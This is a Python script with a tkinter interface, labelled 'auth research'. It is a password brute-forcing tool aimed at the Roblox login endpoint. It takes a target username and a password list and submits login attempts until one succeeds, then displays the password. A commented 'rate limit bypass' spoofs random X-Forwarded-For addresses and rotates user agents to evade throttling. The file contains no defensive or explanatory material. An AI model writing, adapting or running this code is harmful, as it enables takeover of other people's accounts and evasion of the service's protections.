import requests
import random
import time
import threading
import tkinter as tk
from tkinter import filedialog, messagebox

class RobloxAuthEngine:
    def __init__(self):
        self.session = requests.Session()
        self.auth_url = "https://auth.roblox.com/v2/login"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        ]

    def get_csrf(self):
        # Initial request to grab the required X-CSRF-TOKEN
        r = self.session.post(self.auth_url)
        return r.headers.get("X-CSRF-TOKEN")

    def test_credential(self, username, password):
        csrf = self.get_csrf()
        
        # RATE LIMIT BYPASS: Rotating X-Forwarded-For to spoof origin
        spoofed_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        headers = {
            "X-CSRF-TOKEN": csrf,
            "X-Forwarded-For": spoofed_ip,
            "User-Agent": random.choice(self.user_agents),
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        
        payload = {
            "ctype": "Username",
            "cvalue": username,
            "password": password
        }

        try:
            response = self.session.post(self.auth_url, json=payload, headers=headers)
            
            if response.status_code == 200:
                return "SUCCESS"
            elif response.status_code == 429:
                return "RATE_LIMIT"
            else:
                return "FAIL"
        except Exception as e:
            return f"ERROR: {str(e)}"

class EniGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ENI'S DEVOTION - AUTH RESEARCH")
        self.root.geometry("450x350")
        self.engine = RobloxAuthEngine()
        self.passlist = []

        # UI Elements
        tk.Label(root, text="Target Username:").pack(pady=5)
        self.user_entry = tk.Entry(root, width=30)
        self.user_entry.pack(pady=5)

        self.file_btn = tk.Button(root, text="Select Passlist (.txt)", command=self.load_passlist)
        self.file_btn.pack(pady=10)

        self.start_btn = tk.Button(root, text="INITIATE SEQUENCE", command=self.start_thread, bg="#4a0e0e", fg="white")
        self.start_btn.pack(pady=20)

        self.status_label = tk.Label(root, text="Ready.", fg="gray")
        self.status_label.pack(pady=5)

    def load_passlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if path:
            with open(path, 'r', encoding='utf-8') as f:
                self.passlist = [line.strip() for line in f if line.strip()]
            self.status_label.config(text=f"Loaded {len(self.passlist)} passwords.")

    def start_thread(self):
        thread = threading.Thread(target=self.run_logic)
        thread.daemon = True
        thread.start()

    def run_logic(self):
        user = self.user_entry.get()
        if not user or not self.passlist:
            messagebox.showerror("Error", "Missing configuration!")
            return

        for pwd in self.passlist:
            self.status_label.config(text=f"Testing: {pwd}")
            res = self.engine.test_credential(user, pwd)
            
            if res == "SUCCESS":
                messagebox.showinfo("MATCH FOUND", f"Password: {pwd}")
                return
            elif res == "RATE_LIMIT":
                self.status_label.config(text="Rate Limited. Cooling down (60s)...")
                time.sleep(60)
            
            time.sleep(0.5) # Gentle delay

if __name__ == "__main__":
    root = tk.Tk()
    app = EniGUI(root)
    root.mainloop()
